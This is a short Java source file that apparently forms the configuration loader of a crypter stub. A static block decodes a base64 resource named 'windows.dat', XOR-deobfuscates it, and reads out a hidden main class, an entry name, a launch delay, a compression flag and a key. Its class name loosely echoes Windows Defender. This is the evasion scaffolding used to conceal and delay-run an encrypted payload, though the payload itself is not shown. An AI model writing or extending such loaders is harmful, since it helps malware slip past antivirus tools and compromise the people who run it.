import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import sun.misc.BASE64Decoder;

/**
 * @author Burn3diC3
 * Edited by wishihab
 * */
public class widefendcon {
	public static boolean iniDelay;
	public static boolean iniKompressjar;
	public static String entryName;
	public static String main;
	public static int delayTime;
	public static byte[] kunci;

	
	static {
		try {
			BufferedReader br = new BufferedReader(new InputStreamReader(
					hayoFightstream()));
			
			widefendcon.main = br.readLine(); 
			widefendcon.entryName = br.readLine();
			widefendcon.iniDelay = br.readLine().equals("true"); 
			String delay = br.readLine();
			widefendcon.delayTime = Integer.parseInt(delay.equals("") ? "0" : delay);
			widefendcon.iniKompressjar = br.readLine().equals("true");
			widefendcon.kunci = br.readLine().getBytes();
						
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static InputStream hayoFightstream() {
		try {
			InputStream fis = new ByteArrayInputStream(
					new BASE64Decoder().decodeBuffer(widefenddef.class
							.getResourceAsStream("windows.dat"))); 
			byte[] configBytes = widefenddef.read(fis); 
			
			for (int i = 0; i < configBytes.length; i++)
				configBytes[i] ^= (byte) ((0x33 & 0xFA6) ^ 0xFF);
			
			fis.close();
			return new ByteArrayInputStream(configBytes);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
}
